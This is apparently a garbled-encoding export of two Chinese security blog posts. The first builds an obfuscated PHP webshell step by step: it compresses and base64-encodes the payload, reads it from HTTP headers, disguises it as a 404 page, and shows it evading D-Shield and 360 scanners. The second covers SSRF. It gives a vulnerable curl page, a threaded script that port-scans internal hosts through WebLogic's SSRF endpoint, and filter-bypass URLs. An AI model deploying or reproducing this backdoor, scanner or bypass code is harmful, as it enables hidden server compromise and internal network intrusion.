      <url>/2017/06/05/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B0%8F%E6%8A%80%E5%B7%A7%E4%B9%8B%E8%BF%87waf%E6%9C%A8%E9%A9%AC/</url>
      <content type="html"><![CDATA[<p>åœ¨ç ”ç©¶webshellæŸ¥æ€çš„æ—¶å€™ï¼Œå­¦ä¹ åˆ«äººæ€ä¹ˆç»•wafçš„æ€è·¯ï¼Œä»Šå¤©å‘ç°ä¸€ä¸ªå¾ˆ6çš„å‡½æ•°(è‡³å°‘ä¹‹å‰æˆ‘æ˜¯æ²¡è§è¿‡)ï¼Œç„¶åç»“åˆä¹‹å‰å†™è®¿é—®æ—¥å¿—è®°å½•æ–‡ä»¶æ—¶ç”¨åˆ°çš„æ–¹æ³•ï¼Œvery perfectï¼<br><a id="more"></a></p>
<h1 id="Once-step"><a href="#Once-step" class="headerlink" title="Once step"></a>Once step</h1><p>æ™®é€šä¸€å¥è¯æœ¨é©¬ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?php eval($_POST[&apos;caidao&apos;]);?&gt;</div></pre></td></tr></table></figure>
<h1 id="Second-step"><a href="#Second-step" class="headerlink" title="Second step"></a>Second step</h1><p>é¦–å…ˆå¤§å®¶çœ‹ä¸‹è¿™ä¸ªä¸œè¥¿ï¼š<br><img src="http://oa8y5guqs.bkt.clouddn.com/webshell1.png" alt=""></p>
<p>ä¸çŸ¥é“å¤§å®¶çœ‹åˆ°è¿™ä¸ªå­—ç¬¦ä¸²ä¼šæœ‰å•¥æƒ³æ³•ï¼Œåæ­£è¯´å®è¯ï¼Œä¹‹å‰æˆ‘è‚¯å®šä¸ä¼šå¤ªåœ¨æ„ã€‚çœ‹ä¸‹æºç ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$compressed   = gzcompress(&apos;&lt;?php eval($_POST[\&apos;caidao\&apos;]);?&gt;&apos;, 9);</div><div class="line">$uncompressed = gzuncompress($compressed);</div><div class="line">echo $compressed;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h1 id="Third-step"><a href="#Third-step" class="headerlink" title="Third step"></a>Third step</h1><p>é‚£ä¹ˆé‡ç‚¹æ¥äº†ï¼</p>
<p>æˆ‘è¦è¯´çš„å°±æ˜¯<code>gzcompress</code>è¿™ä¸ªå‡½æ•°ã€‚ç„¶åæˆ‘åˆæŸ¥äº†æŸ¥ç›¸å…³èµ„æ–™ï¼Œæ‰¾åˆ°äº†PHPä¸­å…·æœ‰ç›¸åŒåŠŸèƒ½çš„å‡½æ•°è¿˜æœ‰ä¸¤ä¸ªï¼š<code>gzdeflate</code>ï¼Œ<code>gzencode</code>ã€‚</p>
<p>ç§‘æ™®ä¸‹:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">å‹ç¼©å‡½æ•°ï¼šgzcompress gzdeflate gzencode</div><div class="line">è§£å‹å‡½æ•°ï¼šgzuncompress gzinflate gzdecode</div><div class="line"></div><div class="line">gzdecodeæ˜¯PHP 5.4.0ä¹‹åæ‰åŠ å…¥çš„ï¼Œä½¿ç”¨çš„æ—¶å€™è¦æ³¨æ„å…¼å®¹æ€§é—®é¢˜ã€‚</div><div class="line">è¿™å‡ ä¸ªå‡½æ•°éƒ½ä»¥gzå¼€å¤´ï¼Œè®©äººæƒ³åˆ°gzipå‹ç¼©ï¼Œè€Œå…‰çœ‹å‡½æ•°åå´åˆçœ‹ä¸å‡ºå®ƒä»¬ä¹‹é—´çš„åŒºåˆ«ï¼Œåªèƒ½æŸ¥æ–‡æ¡£ã€‚</div><div class="line">gzcompress gzdeflate gzencodeå‡½æ•°çš„åŒºåˆ«åœ¨äºå®ƒä»¬å‹ç¼©çš„æ•°æ®æ ¼å¼ä¸åŒï¼š</div><div class="line">gzcompressä½¿ç”¨çš„æ˜¯ZLIBæ ¼å¼ï¼›</div><div class="line">gzdeflateä½¿ç”¨çš„æ˜¯çº¯ç²¹çš„DEFLATEæ ¼å¼ï¼›</div><div class="line">gzencodeä½¿ç”¨çš„æ˜¯GZIPæ ¼å¼ï¼›</div><div class="line"></div><div class="line">å…¶å®ä»PHP 5.4.0å¼€å§‹ï¼Œè¿™ä¸‰ä¸ªå‡½æ•°æ˜¯ä¸€æ ·çš„ï¼Œåªä¸è¿‡ç¬¬ä¸‰ä¸ªå‚æ•°çš„é»˜è®¤å€¼ä¸åŒï¼›å¦‚æœè°ƒç”¨æ—¶ä¼ å…¥ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œé‚£ä¹ˆè¿™ä¸‰ä¸ªå‡½æ•°è¿”å›çš„æ•°æ®ç›¸åŒã€‚</div><div class="line"></div><div class="line">æœ‰å…´è¶£çš„è‡ªå·±åœ¨æ‰¾æ‰¾å§</div></pre></td></tr></table></figure></p>
<h1 id="Fourth-step"><a href="#Fourth-step" class="headerlink" title="Fourth step"></a>Fourth step</h1><p>å†™ä¸ªç”Ÿæˆå¯†æ–‡çš„æ–‡ä»¶ã€‚</p>
<p>è€ƒè™‘åˆ°å¯èƒ½å­—ç¬¦æ˜¾ç¤ºä¸å…¨ï¼Œæ— æ³•è¯†åˆ«ç­‰åŸå› ï¼Œå†å¥—ä¸€å±‚base64ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">if(isset($_POST[&apos;str&apos;]))&#123;</div><div class="line">	$str = $_POST[&apos;str&apos;];</div><div class="line">	$compressed = base64_encode(gzcompress($str, 9));</div><div class="line">	echo $compressed;</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<h1 id="Fifth-step"><a href="#Fifth-step" class="headerlink" title="Fifth step"></a>Fifth step</h1><p>ç»“åˆè®¿é—®æ—¥å¿—è®°å½•ç”¨åˆ°çš„<code>getallheaders</code>å‡½æ•°ï¼Œæœ€ç»ˆçš„webshellå¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?php eval(gzuncompress(base64_decode(getallheaders()[&apos;w2n1ck&apos;])));&gt;</div></pre></td></tr></table></figure>
<p>ç”¨Dç›¾æŸ¥ä¸€ä¸‹</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/webshell2.png" alt=""></p>
<p>è™½ç„¶çº§åˆ«æ˜¯å°äº3ï¼Œä½†æ˜¯è¯´æ˜é‡Œé¢æ˜¾ç¤ºå¯èƒ½evalåé—¨ï¼Œæ‰€ä»¥è¦å»æ‰è¿™ä¸ªï¼Œåœ¨å˜å½¢ä¸‹ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?php $w2n1ck1=gzuncompress(base64_decode(getallheaders()[&apos;cai&apos;]));$w2n1ck1(gzuncompress(base64_decode(getallheaders()[&apos;dao&apos;])));&gt;</div></pre></td></tr></table></figure></p>
<p>çœ‹ä¸‹webshellå¯ç”¨æ€§</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/webshell3.png" alt=""></p>
<p>è¿™é‡Œæ³¨æ„ä¸‹ï¼Œä½¿ç”¨evalçš„è¯ä¼šæŠ¥é”™ï¼Œå…·ä½“çš„åŸå› è¯·æŸ¥çœ‹<a href="https://stackoverflow.com/questions/29707896/undefined-function-eval-php" target="_blank" rel="external">é”™è¯¯è¯¦æƒ…</a></p>
<p>åœ¨å®‰åˆ©ä¸‹å‘½ä»¤æ‰§è¡Œçš„ä¸€äº›å‡½æ•°ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos;`&apos;,eval,assert,exec,passthru,shell_exec,system,putenv,preg_replace,pcntl_exec,popen,proc_open</div></pre></td></tr></table></figure></p>
<h1 id="Sixth-step"><a href="#Sixth-step" class="headerlink" title="Sixth step"></a>Sixth step</h1><p>å†ç”¨Dç›¾æ£€æµ‹ä¸‹<br><img src="http://oa8y5guqs.bkt.clouddn.com/webshell4.png" alt=""></p>
<p>è¿˜æ˜¯å¯ç–‘å•Šï¼Œé‚£è¡Œå†ä¼ªé€ ä¼ªé€ ä¸‹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;</div><div class="line">&lt;html&gt;&lt;head&gt;</div><div class="line">&lt;title&gt;404 Not Found&lt;/title&gt;</div><div class="line">&lt;/head&gt;&lt;body&gt;</div><div class="line">&lt;h1&gt;Not Found&lt;/h1&gt;</div><div class="line">&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;</div><div class="line">&lt;?php</div><div class="line">$cai=getallheaders()[&apos;cai&apos;];</div><div class="line">$dao=getallheaders()[&apos;dao&apos;];</div><div class="line">if($cai!=&quot;&quot; and $dao!=&quot;&quot;)&#123;</div><div class="line">  $cai=gzuncompress(base64_decode($cai));$cai(gzuncompress(base64_decode($dao)));</div><div class="line">&#125;</div><div class="line">header(&apos;HTTP/1.1 404 Not Found&apos;);</div><div class="line">?&gt;</div><div class="line">&lt;/body&gt;&lt;/html&gt;</div></pre></td></tr></table></figure></p>
<p>å†æ£€æµ‹ä¸‹ï¼š</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/webshell5.png" alt=""><br>360 5å¼•æ“æ£€æµ‹ä¸‹<br><img src="http://oa8y5guqs.bkt.clouddn.com/webshell7.png" alt=""><br>very perfectï¼</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/webshell6.png" alt=""></p>
<p>å¦‚æœè§‰å¾—è‡ªå·±æ·»åŠ å¤´éº»çƒ¦å¯ç–‘ä½¿ç”¨è‡ªå¸¦çš„è¯·æ±‚å¤´å­—æ®µï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">getallheaders()[&apos;Accept-Language&apos;]</div><div class="line">getallheaders()[&apos;User-Agent&apos;]</div><div class="line">getallheaders()[&apos;Accept&apos;]</div></pre></td></tr></table></figure></p>
]]></content>
      
        
        <tags>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
            <tag> WAFç»•è¿‡ </tag>
            
            <tag> PHP </tag>
            
            <tag> webshell </tag>
            
            <tag> Dç›¾ </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[SSRFæ¼æ´å‰–æä¸åˆ©ç”¨]]></title>
      <url>/2017/06/04/SSRF%E6%BC%8F%E6%B4%9E%E5%89%96%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/</url>
      <content type="html"><![CDATA[<p>æœ€è¿‘ç©çš„æ—¶å€™æƒ³æ‰¾ä¸€ä¸‹SSRFçš„ç›¸å…³çŸ¥è¯†ï¼Œå»è‡ªå·±åšå®¢ä¸Šä¸€çœ‹ï¼ŒWTFç«Ÿç„¶è¿˜æ²¡æœ‰ï¼å¥½å§ã€‚ã€‚é‚£å°±å†™ä¸€ä¸ªå§ï¼Œæ–¹ä¾¿è‡ªå·±ä»¥åæŸ¥çœ‹ï¼Œå¤§ç‰›ä»¬å¤šå¤šæŒ‡ç‚¹ã€‚<br><a id="more"></a></p>
<h1 id="Know-it"><a href="#Know-it" class="headerlink" title="Know it"></a>Know it</h1><p>(è®©æˆ‘è£…ä¸ªé€¼ï¼Œæ¨¡ä»¿ä¸‹çŒªçŒªä¾ çš„è¯ã€‚ã€‚ã€‚)</p>
<h2 id="ä»€ä¹ˆæ˜¯SSRF"><a href="#ä»€ä¹ˆæ˜¯SSRF" class="headerlink" title="ä»€ä¹ˆæ˜¯SSRF"></a>ä»€ä¹ˆæ˜¯SSRF</h2><p>Freebuf:å¾ˆå¤šwebåº”ç”¨éƒ½æä¾›äº†ä»å…¶ä»–çš„æœåŠ¡å™¨ä¸Šè·å–æ•°æ®çš„åŠŸèƒ½ã€‚ä½¿ç”¨ç”¨æˆ·æŒ‡å®šçš„URLï¼Œwebåº”ç”¨å¯ä»¥è·å–å›¾ç‰‡ï¼Œä¸‹è½½æ–‡ä»¶ï¼Œè¯»å–æ–‡ä»¶å†…å®¹ç­‰ã€‚è¿™ä¸ªåŠŸèƒ½å¦‚æœè¢«æ¶æ„ä½¿ç”¨ï¼Œå¯ä»¥åˆ©ç”¨å­˜åœ¨ç¼ºé™·çš„webåº”ç”¨ä½œä¸ºä»£ç†æ”»å‡»è¿œç¨‹å’Œæœ¬åœ°çš„æœåŠ¡å™¨ã€‚è¿™ç§å½¢å¼çš„æ”»å‡»ç§°ä¸ºæœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ æ”»å‡»ï¼ˆServer-side Request Forgeryï¼‰</p>
<p>ä¸€å¥è¯å°±æ˜¯ï¼šåˆ©ç”¨ä¸€ä¸ªå¯ä»¥å‘èµ·ç½‘ç»œè¯·æ±‚çš„æœåŠ¡ï¼Œå½“ä½œè·³æ¿æ¥æ”»å‡»å…¶ä»–æœåŠ¡ã€‚</p>
<h2 id="SSRFèƒ½å¹²ä»€ä¹ˆ"><a href="#SSRFèƒ½å¹²ä»€ä¹ˆ" class="headerlink" title="SSRFèƒ½å¹²ä»€ä¹ˆ"></a>SSRFèƒ½å¹²ä»€ä¹ˆ</h2><ul>
<li>æ¢æµ‹å†…ç½‘ä¿¡æ¯</li>
<li>æ”»å‡»å†…ç½‘æˆ–æœ¬åœ°å…¶ä»–æœåŠ¡</li>
<li>ç©¿é€é˜²ç«å¢™</li>
<li>ã€‚ã€‚ã€‚</li>
</ul>
<h2 id="æ€ä¹ˆæ‰¾SSRFæ¼æ´"><a href="#æ€ä¹ˆæ‰¾SSRFæ¼æ´" class="headerlink" title="æ€ä¹ˆæ‰¾SSRFæ¼æ´"></a>æ€ä¹ˆæ‰¾SSRFæ¼æ´</h2><ul>
<li>èƒ½å¤Ÿå¯¹å¤–å‘èµ·ç½‘ç»œè¯·æ±‚çš„åœ°æ–¹</li>
<li>è¯·æ±‚è¿œç¨‹æœåŠ¡å™¨èµ„æºçš„åœ°æ–¹</li>
<li>æ•°æ®åº“å†…ç½®åŠŸèƒ½</li>
<li>é‚®ä»¶ç³»ç»Ÿ</li>
<li>æ–‡ä»¶å¤„ç†</li>
<li>ã€‚ã€‚ã€‚</li>
</ul>
<p>ä¸¾å‡ ä¸ªä¾‹å­ï¼š</p>
<ul>
<li>åœ¨çº¿è¯†å›¾ï¼Œåœ¨çº¿æ–‡æ¡£ç¿»è¯‘ï¼Œåˆ†äº«ï¼Œè®¢é˜…ç­‰ï¼Œè¿™äº›æœ‰çš„éƒ½ä¼šå‘èµ·ç½‘ç»œè¯·æ±‚ã€‚</li>
<li>æ ¹æ®è¿œç¨‹URLä¸Šä¼ ï¼Œé™æ€èµ„æºå›¾ç‰‡ç­‰ï¼Œè¿™äº›ä¼šè¯·æ±‚è¿œç¨‹æœåŠ¡å™¨çš„èµ„æºã€‚</li>
<li>æ•°æ®åº“çš„æ¯”å¦‚mongodbçš„copyDatabaseå‡½æ•°ï¼Œè¿™ç‚¹çœ‹çŒªçŒªä¾ è®²çš„å§ï¼Œæ²¡å®è·µè¿‡ã€‚</li>
<li>é‚®ä»¶ç³»ç»Ÿå°±æ˜¯æ¥æ”¶é‚®ä»¶æœåŠ¡å™¨åœ°å€è¿™äº›åœ°æ–¹ã€‚</li>
<li>æ–‡ä»¶å°±æ‰¾ImageMagickï¼Œxmlè¿™äº›ã€‚</li>
<li>ä»URLå…³é”®å­—ä¸­å¯»æ‰¾ï¼Œæ¯”å¦‚ï¼š<code>source</code>,<code>share</code>,<code>link</code>,<code>src</code>,<code>imageurl</code>,<code>target</code>ç­‰ã€‚</li>
</ul>
<h2 id="SSRFæ€ä¹ˆå½¢æˆçš„"><a href="#SSRFæ€ä¹ˆå½¢æˆçš„" class="headerlink" title="SSRFæ€ä¹ˆå½¢æˆçš„"></a>SSRFæ€ä¹ˆå½¢æˆçš„</h2><p>SSRFå½¢æˆçš„åŸå› å°±æ˜¯ç”±äºæœåŠ¡ç«¯æä¾›äº†èƒ½å¤Ÿå‘èµ·ç½‘ç»œè¯·æ±‚æˆ–è€…ä»å…¶ä»–æœåŠ¡å™¨è·å–ç›¸å…³èµ„æºæ•°æ®ç­‰ï¼Œä½†æ˜¯æ²¡æœ‰å¯¹ç›¸å…³ç›®æ ‡åœ°å€åšä»»ä½•çš„é™åˆ¶æˆ–è¿‡æ»¤ï¼Œä»è€Œå¯¼è‡´SSRFæ¼æ´ã€‚</p>
<h1 id="Hack-it"><a href="#Hack-it" class="headerlink" title="Hack it"></a>Hack it</h1><h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>ä¸»è¦æ¨¡ä»¿curlæ¥è¯·æ±‚èµ„æºï¼Œå†™å…¥ç›¸å…³æ–‡ä»¶ï¼Œä¹‹åå¹¶æ˜¾ç¤ºç›¸å…³æ•°æ®ã€‚</p>
<p><strong>ssrf.html</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">	&lt;title&gt;ssrf test&lt;/title&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;center&gt;</div><div class="line">	&lt;form name=&quot;input&quot; action=&quot;ssrf.php&quot; method=&quot;POST&quot;&gt;</div><div class="line">	&lt;h2&gt;Search: &lt;input type=&quot;text&quot; name=&quot;url&quot;&gt;&lt;/h2&gt;</div><div class="line">	&lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt;</div><div class="line">&lt;/form&gt;</div><div class="line">&lt;/center&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
<p><strong>ssrf.php</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">if(isset($_POST[&apos;url&apos;]))&#123;</div><div class="line">   $link = $_POST[&apos;url&apos;];</div><div class="line">   $filename = &apos;./&apos;.rand().&apos;.txt&apos;;</div><div class="line">   $curlobj = curl_init($link);</div><div class="line">   $fp = fopen($filename,&quot;w&quot;);</div><div class="line">   curl_setopt($curlobj,CURLOPT_FILE,$fp);</div><div class="line">   curl_setopt($curlobj,CURLOPT_HEADER,0);</div><div class="line">   curl_exec($curlobj);</div><div class="line">   curl_close($curlobj);</div><div class="line">   fclose($fp);</div><div class="line">   $fp = fopen($filename,&quot;r&quot;);</div><div class="line">   $result = fread($fp,filesize($filename));</div><div class="line">   fclose($fp);</div><div class="line">   echo $result;</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>è¿™é‡Œä½¿ç”¨192.168.1.113ä½œä¸ºè¾¹ç•ŒæœåŠ¡å™¨ï¼Œ192.168.2.3ä½œä¸ºå†…ç½‘æœåŠ¡å™¨ã€‚<br><img src="http://oa8y5guqs.bkt.clouddn.com/ssrf1.png" alt=""><br>æ•°æ®å†…ç½‘æœåŠ¡å™¨åœ°å€<br><img src="http://oa8y5guqs.bkt.clouddn.com/ssrf2.png" alt=""><br>æˆåŠŸæ˜¾ç¤ºå†…ç½‘æœåŠ¡å™¨ä¿¡æ¯</p>
<h2 id="æ¼æ´å®è·µ"><a href="#æ¼æ´å®è·µ" class="headerlink" title="æ¼æ´å®è·µ"></a>æ¼æ´å®è·µ</h2><p>è¿™é‡Œä»¥weblogicçš„SSRFä¸ºä¾‹(çŒªçŒªä¾ æ‰€è¯´çš„ç¥æ´)ã€‚å¦‚å›¾æ˜¾ç¤ºåˆ™å°±æ˜¯å­˜åœ¨SSRFæ¼æ´äº†ã€‚<br><img src="http://oa8y5guqs.bkt.clouddn.com/ssrf3.png" alt=""></p>
<p>å¥½äº†ï¼Œåˆ°ç°åœ¨å’±ä»¬å·²ç»çŸ¥é“å­˜åœ¨è¿™ä¸ªæ¼æ´äº†ï¼Œç„¶ååº”è¯¥æ€æ ·å¿«é€Ÿå®šä½è¯¥æœåŠ¡å™¨æ‰€åœ¨çš„å†…ç½‘åœ°å€å‘¢?</p>
<p>è¿™é‡Œç›®å‰æˆ‘çŸ¥é“çš„æœ‰ä¸‰ç§æ–¹æ³•ï¼š</p>
<ol>
<li>ä½¿ç”¨è„šæœ¬çˆ†ç ´<code>192.168.*.*</code>ï¼Œ<code>172.16.*.*-172.31.*.*</code>ï¼Œ<code>10.*.*.*</code>è¿™ä¸‰ä¸ªå†…ç½‘æ®µ</li>
<li>ä½¿ç”¨burpçˆ†ç ´åŒä¸Š</li>
<li>ä½¿ç”¨<code>file:///</code> ï¼Œ<code>gophar://</code>ï¼Œ<code>ftp://</code>ç­‰è¿™äº›æœåŠ¡å™¨å…è®¸çš„åè®®å»è¯»å–procé‡Œå¯èƒ½åŒ…å«IPåœ°å€ä¿¡æ¯çš„ç›¸å…³æ–‡ä»¶</li>
</ol>
<p>è¿™é‡Œæˆ‘å°±å…ˆç®€å•ç²—æš´çš„ä½¿ç”¨burpæ¥ä¸€å‘å§ã€‚<br><img src="http://oa8y5guqs.bkt.clouddn.com/ssrf4.png" alt=""></p>
<p>ã€‚ã€‚ã€‚è¿æ°”çœŸç‰¹ä¹ˆçš„å¥½ã€‚</p>
<h2 id="å†…ç½‘æ¢æµ‹"><a href="#å†…ç½‘æ¢æµ‹" class="headerlink" title="å†…ç½‘æ¢æµ‹"></a>å†…ç½‘æ¢æµ‹</h2><p>æ¢æµ‹å†…ç½‘å†…çš„æ‰€æœ‰ä¸»æœºåŠå¼€æ”¾çš„ç«¯å£ä¿¡æ¯ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line"># -*- coding: UTF-8 -*-</div><div class="line">&apos;&apos;&apos;</div><div class="line">@Authorï¼šw2n1ck</div><div class="line">@Indexï¼šhttp://www.w2n1ck.com/</div><div class="line">&apos;&apos;&apos;</div><div class="line">import Queue</div><div class="line">from threading import Thread</div><div class="line">import threading</div><div class="line">import urllib</div><div class="line">import urllib2</div><div class="line">import re</div><div class="line">import requests</div><div class="line"></div><div class="line">base_url = &apos;http://xxx.xxx.xxx&apos;</div><div class="line">thread_list=[]</div><div class="line"></div><div class="line">port_list = [21,22,23,25,69,80,81,82,83,84,110,389,398,443,445,488,512,513,514,873,901,1043,1080,1099,1090,1158,1352,1433,1434,1521,2049,2100,2181,2601,2604,3128,3306,3307,3389,4440,4444,4445,4848,5000,5280,5432,5500,5632,5900,5901,5902,5903,5984,6000,6033,6082,6379,6666,7001,7001,7002,7070,7101,7676,7777,7899,7988,8000,8001,8002,8003,8004,8005,8006,8007,8008,8009,8069,8080,8081,8082,8083,8084,8085,8086,8087,8088,8089,8090,8091,8092,8093,8094,8095,8098,8099,8980,8990,8443,8686,8787,8880,8888,9000,9001,9043,9045,9060,9080,9081,9088,9088,9090,9091,9100,9200,9300,9443,9871,9999,10000,10068,10086,11211,20000,22022,22222,27017,28017,50060,50070]</div><div class="line"></div><div class="line">que = Queue.Queue()</div><div class="line">lock = threading.Lock()</div><div class="line"></div><div class="line">for port in port_list:</div><div class="line">    que.put(port)</div><div class="line">def run():</div><div class="line">    for i in range(1,256):</div><div class="line">        while que.qsize() &gt; 0:</div><div class="line">            port = que.get()</div><div class="line">            #print &quot;ip:172.16.2.&#123;ip&#125;:&#123;port&#125;&quot;.format(ip=i,port=port)</div><div class="line">            url = &quot;http://xxx.xxx.xxx/uddiexplorer/SearchPublicRegistries.jsp?operator=http://172.16.2.%d:%d&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&quot; % (i,port)</div><div class="line">            try:</div><div class="line">                content = requests.get(url,timeout=20,verify=False).content</div><div class="line">                #ssrfæ£€æµ‹</div><div class="line">                result1 = re.findall(&apos;weblogic.uddi.client.structures.exception.XML_SoapException&apos;,content)</div><div class="line">                result2 = re.findall(&apos;but could not connect&apos;,content)</div><div class="line">                result3 = re.findall(&apos;No route to host&apos;,content)</div><div class="line">                if len(result1) != 0 and len(result2) == 0 and len(result3) == 0:</div><div class="line">                        print &quot;http://172.16.2.&#123;ip&#125;:&#123;port&#125; is open&quot;.format(ip=i,port=port)</div><div class="line">            except Exception,e:</div><div class="line">                    pass</div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    for i in xrange(20):</div><div class="line">        t=Thread(target=run)</div><div class="line">        thread_list.append(t)</div><div class="line">    for t in thread_list:</div><div class="line">        t.start()</div><div class="line">    for t in thread_list:</div><div class="line">        t.join()</div></pre></td></tr></table></figure></p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/ssrf5.png" alt=""></p>
<h2 id="SSRFç»•è¿‡æŠ€å·§"><a href="#SSRFç»•è¿‡æŠ€å·§" class="headerlink" title="SSRFç»•è¿‡æŠ€å·§"></a>SSRFç»•è¿‡æŠ€å·§</h2><h3 id="1ã€"><a href="#1ã€" class="headerlink" title="1ã€@"></a>1ã€@</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">http://abc@127.0.0.1</div><div class="line">å®é™…ä¸Šæ˜¯ä»¥ç”¨æˆ·åabcè¿æ¥åˆ°ç«™ç‚¹127.0.0.1ï¼ŒåŒç†</div><div class="line">http://8.8.8.8@127.0.0.1:8080ã€http://127.0.0.1#8.8.8.8</div></pre></td></tr></table></figure>
<h3 id="2ã€æ·»åŠ ç«¯å£å·"><a href="#2ã€æ·»åŠ ç«¯å£å·" class="headerlink" title="2ã€æ·»åŠ ç«¯å£å·"></a>2ã€æ·»åŠ ç«¯å£å·</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1:8080</div></pre></td></tr></table></figure>
<h3 id="3ã€çŸ­åœ°å€"><a href="#3ã€çŸ­åœ°å€" class="headerlink" title="3ã€çŸ­åœ°å€"></a>3ã€çŸ­åœ°å€</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://á„’.ws/ir</div></pre></td></tr></table></figure>
<h3 id="4ã€ç‰¹æ®ŠåŸŸå"><a href="#4ã€ç‰¹æ®ŠåŸŸå" class="headerlink" title="4ã€ç‰¹æ®ŠåŸŸå"></a>4ã€ç‰¹æ®ŠåŸŸå</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">10.0.0.1.xip.io == 10.0.0.1</div><div class="line">www.10.0.0.1.xip.io == 10.0.0.1</div><div class="line">fuzz.ssrf.10.0.0.1.xip.io == 10.0.0.1</div></pre></td></tr></table></figure>
